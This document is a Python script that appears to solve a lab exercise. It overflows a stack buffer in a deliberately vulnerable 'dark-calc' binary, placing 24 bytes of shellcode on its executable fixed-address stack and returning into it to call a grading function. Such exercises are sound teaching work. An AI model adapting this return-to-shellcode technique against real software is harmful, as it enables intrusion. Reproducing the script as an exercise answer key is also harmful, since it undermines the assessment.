#!/usr/bin/env python3
"""Task 2: put shellcode on the fixed stack and jump to it.

dark-calc's stack is mapped PROT_READ|PROT_WRITE|PROT_EXEC by
init_fixed_stack(), and its address never changes, so we can hard-code it.

expression[] lives at 0x721000800fd0.  Shellcode is 24 bytes, so it fills
buffer + saved rbp; the return address at +0x18 points back at the buffer.

Stack alignment matters: when the shellcode starts, rsp == expr+0x20, which is
16-byte aligned, so `call rax` lands in grade_eval() with the rsp%16 == 8 that
the SysV ABI promises -- printf() inside grade_eval() will not die on movaps.
Neither call writes below expr+0x18, i.e. the code below is never overwritten
while it is still being fetched.
"""
import sys
from struct import pack

EXPR = 0x721000800FD0
GRADE_EVAL = 0x401A87
EXIT_PLT   = 0x401880

shellcode = bytes.fromhex(
    "bf04000000"    # mov  edi, 4
    "b8871a4000"    # mov  eax, 0x401a87      ; grade_eval
    "ffd0"          # call rax                ; prints "Hope A ..."
    "bf00000000"    # mov  edi, 0
    "b880184000"    # mov  eax, 0x401880      ; exit@plt
    "ffd0"          # call rax
)
assert len(shellcode) == 0x18, len(shellcode)

payload  = shellcode
payload += pack("<Q", EXPR)     # return address -> our code on the stack

sys.stdout.buffer.write(payload + b"\n")
